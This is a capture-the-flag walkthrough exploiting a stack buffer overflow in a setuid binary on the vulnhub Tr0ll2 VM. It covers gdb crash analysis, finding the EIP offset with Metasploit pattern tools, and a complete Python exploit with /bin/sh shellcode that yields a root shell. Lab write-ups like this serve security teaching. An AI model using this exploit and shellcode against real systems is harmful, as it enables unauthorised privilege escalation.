I found a really good buffer overflow (BOF) example on vulnhub platform, tr0ll2 VM [Download Link](https://www.vulnhub.com/entry/tr0ll-2,107/)

Let's exploit it now "normal way".

# 0x01 Binary Enumeration

Let's run the binary normal first & then let's try to crash it.

```bash
noob@Tr0ll2:/exploit$ ./binary
Usage: ./binary input
noob@Tr0ll2:/exploit$ ./binary 1337
1337
noob@Tr0ll2:/exploit$ ./binary $(python -c 'print "A" * 600')
Segmentation fault
```

Perfect, let's re-check the vulnerable function.

```bash
noob@Tr0ll2:/exploit$ gdb -q binary
Reading symbols from /exploit/binary...done.
(gdb) info functions
All defined functions:

File bof.c:
int main(int, char **);

Non-debugging symbols:
0x080482f4  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  strcpy     <-- Vulnerable Function
0x08048350  strcpy@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  exit
0x08048370  exit@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x080484b0  __libc_csu_init
0x08048520  __libc_csu_fini
0x08048522  __i686.get_pc_thunk.bx
0x08048530  __do_global_ctors_aux
0x0804855c  _fini
(gdb) 
```

Let's find the offset now. How many chars overwrite EIP.

Let's create a pattern first with msf.

```bash
[root@pwn4magic]:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
```

Let's pass this now in gdb as input.

```bash
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
Starting program: /exploit/binary Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
(gdb) 
```

Gave as this address `0x6a413969` let's use now pattern offset.

```bash
[root@pwn4magic]:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6a413969
[*] Exact match at offset 268
```

Let's check now the registers, to see if we really overwrite EIP.

```bash
(gdb) r $(python -c 'print "A" * 268 + "B" * 4 + "\x90" * 20')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /exploit/binary $(python -c 'print "A" * 268 + "B" * 4 + "\x90" * 20')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info registers
eax            0x124	292
ecx            0x0	0
edx            0x0	0
ebx            0xb7fd1ff4	-1208147980
esp            0xbffffbb0	0xbffffbb0
ebp            0x41414141	0x41414141
esi            0x0	0
edi            0x0	0
eip            0x42424242	0x42424242
eflags         0x210286	[ PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
```

Perfect! Now we will display memory contents from ESP register.

```bash
(gdb) x/250xbw $esp
0xbffffbb0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbc0:	0x90909090	0xbffffc00	0xbffffc50	0x00000000
0xbffffbd0:	0x0804823c	0xb7fd1ff4	0x00000000	0x00000000
0xbffffbe0:	0x00000000	0x28574ab4	0x1f090ea4	0x00000000
```

```
x -> hex
b -> byte
w -> word (32-bit value)
```

We can see there our x90 Let's build our exploit now.

# 0x02 Exploitation

We need shellcode now i found a /bin/sh one 23 bytes. [Link](http://shell-storm.org/shellcode/files/shellcode-827.php)

`exploit.py`

```python
from struct import pack
 
def p(x):
    return pack('<L', x)

payload = "A" * 268
payload += p(0xbffffbd0)
payload += "\x90" * 16
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

print payload
```

Let's run it.

```bash
noob@Tr0ll2:/exploit$ ./binary $(python /tmp/exploit.py)
# whoami
root
```

-pwn4magic
